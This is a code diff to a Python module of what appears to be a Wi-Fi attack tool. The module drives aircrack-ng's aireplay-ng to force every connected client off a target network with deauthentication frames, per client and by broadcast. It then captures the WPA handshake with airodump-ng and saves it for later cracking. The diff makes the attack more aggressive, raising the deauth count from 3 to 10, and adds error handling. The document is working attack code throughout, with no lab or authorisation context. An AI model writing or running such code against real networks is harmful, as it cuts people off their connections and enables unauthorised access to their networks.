@@ -6,7 +6,7 @@ import subprocess
 import threading
 import shutil
 from datetime import datetime
-from utils import colored_log, execute_command
+from utils import colored_log, execute_command, sanitize_ssid
 from scanner import detect_connected_clients
 from rich.console import Console
 
@@ -17,7 +17,7 @@ console = Console()
 def capture_handshake(self, network) -> str | None:
     """Capture handshake from target network with countdown"""
     if not self.monitor_interface:
-        colored_log("error", "No monitor mode interface found")
+        colored_log("error", "No monitor mode interface found!")
         return None
 
     # Detect connected clients
@@ -25,19 +25,22 @@ def capture_handshake(self, network) -> str | None:
     if not clients:
         colored_log(
             "error",
-            f"No connected clients detected for {network.essid}. Stopping process",
+            f"No connected clients detected for {network.essid}. Stopping process...",
         )
         return None
 
     # Deauthenticate clients
     deauthenticate_clients(self, network, clients)
 
+    # Sanitize SSID for use in filename
+    safe_essid = sanitize_ssid(network.essid)
+
     # Create capture filename
     timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
-    capture_name = f"{network.essid.replace(' ', '_')}_{timestamp}"
+    capture_name = f"{safe_essid}_{timestamp}"
     capture_path = os.path.join(self.temp_dir, capture_name)
 
-    colored_log("info", f"Starting handshake capture for {network.essid}")
+    colored_log("info", f"Starting handshake capture for {network.essid}...")
 
     # Start capture process
     capture_cmd = [
@@ -51,11 +54,16 @@ def capture_handshake(self, network) -> str | None:
         self.monitor_interface,
     ]
 
-    capture_proc = subprocess.Popen(
-        capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
+    try:
+        capture_proc = subprocess.Popen(
+            capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+    except FileNotFoundError:
+        colored_log(
+            "error", "airodump-ng not found. Make sure aircrack-ng suite is installed."
+        )
+        return None
 
-    # Start countdown
     cap_file = f"{capture_path}-01.cap"
     timeout = 60  # 1 minute
     start_time = time.time()
@@ -83,78 +91,91 @@ def capture_handshake(self, network) -> str | None:
             if elapsed_time >= timeout:
                 console.print(f"{' ' * 80}", end="\r")  # Clear line
                 sys.stdout.flush()
-                colored_log("warning", "Handshake capture timed out after 1 minute")
+                colored_log("warning", "Handshake capture timed out after 1 minute!")
                 break
             time.sleep(1)
     except KeyboardInterrupt:
         console.print(f"{' ' * 80}", end="\r")  # Clear line
         sys.stdout.flush()
-        colored_log("warning", "Capture cancelled by user")
+        colored_log("warning", "Capture cancelled by user!")
     finally:
         capture_proc.send_signal(signal.SIGTERM)
         capture_proc.wait()
 
     if not os.path.exists(cap_file) or not _check_handshake(self, cap_file):
-        colored_log("error", "Failed to capture handshake after deauthentication")
+        colored_log("error", "Failed to capture handshake after deauthentication!")
         return None
 
     # Save handshake file
-    final_path = os.path.join(
-        self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
-    )
+    final_path = os.path.join(self.handshake_dir, f"{safe_essid}.cap")
     shutil.copy(cap_file, final_path)
     colored_log("success", f"Handshake saved to {final_path}")
     return final_path
 
 
 def deauthenticate_clients(self, network, clients: list[str]):
-    """Deauthenticate all connected clients using multithreading without waiting"""
+    """Deauthenticate all connected clients using multithreading with improved effectiveness"""
     colored_log(
         "info",
-        f"Starting deauthentication for {len(clients)} clients on {network.essid}",
+        f"Starting deauthentication for {len(clients)} clients on {network.essid}...",
     )
 
     def deauth_client(client: str):
         deauth_cmd = [
             "aireplay-ng",
             "--deauth",
-            "3",
+            "10",
             "-a",
             network.bssid,
             "-c",
             client,
             self.monitor_interface,
         ]
-        subprocess.Popen(
-            deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
+        try:
+            subprocess.Popen(
+                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+        except FileNotFoundError:
+            colored_log(
+                "error",
+                "aireplay-ng not found. Make sure aircrack-ng suite is installed.",
+            )
 
     threads = []
-    for client in clients:
-        colored_log("info", f"Sending deauth to client {client}")
+    for idx, client in enumerate(clients):
+        colored_log(
+            "info", f"[{idx + 1}/{len(clients)}] Sending deauth to client {client}"
+        )
         thread = threading.Thread(target=deauth_client, args=(client,))
         thread.daemon = True
         thread.start()
         threads.append(thread)
+        time.sleep(0.1)
 
-    for thread in threads:
-        thread.join(timeout=0.5)
+    time.sleep(1)
 
     broadcast_deauth_cmd = [
         "aireplay-ng",
         "--deauth",
-        "3",
+        "10",
         "-a",
         network.bssid,
         self.monitor_interface,
     ]
-    colored_log("info", "Sending broadcast deauthentication")
-    subprocess.Popen(
-        broadcast_deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
+    colored_log("info", "Sending additional broadcast deauthentication...")
+    try:
+        subprocess.Popen(
+            broadcast_deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+    except FileNotFoundError:
+        colored_log(
+            "error", "aireplay-ng not found. Make sure aircrack-ng suite is installed."
+        )
+
+    time.sleep(3)
 
     colored_log(
-        "success", "Deauthentication process initiated for all connected clients"
+        "success", "Deauthentication process initiated for all connected clients!"
     )
 
 
